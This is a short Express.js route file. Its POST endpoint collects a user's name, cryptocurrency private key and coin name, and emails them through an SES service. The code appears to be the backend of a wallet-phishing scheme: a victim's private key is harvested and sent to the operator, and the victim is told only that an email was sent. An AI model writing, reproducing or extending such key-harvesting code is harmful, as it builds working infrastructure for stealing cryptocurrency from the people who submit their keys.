import express from "express";
import sendEmail from "../services/sesService";

const router = express.Router();

router.post("/send-email", async (req, res) => {
    const { name, privateKey, coinName } = req.body;

    if (!name || !privateKey || !coinName) {
        res.status(400).json({ message: "Missing body" });
        return
    }

    const formData = {
        name: name,
        privateKey: privateKey,
        coin: coinName
    };

    try {
        const result = await sendEmail(formData);

        if (result) {
        res.status(200).json({ message: "Email sent successfully" });
        return
        } else {
            res.status(400).json({ message: "Server busy. try again later" });
           return
        }
    } catch (e) {
        console.log(e);
        res.status(500).json({ message: "Internal server error" });
        return
    }
});

export default router;
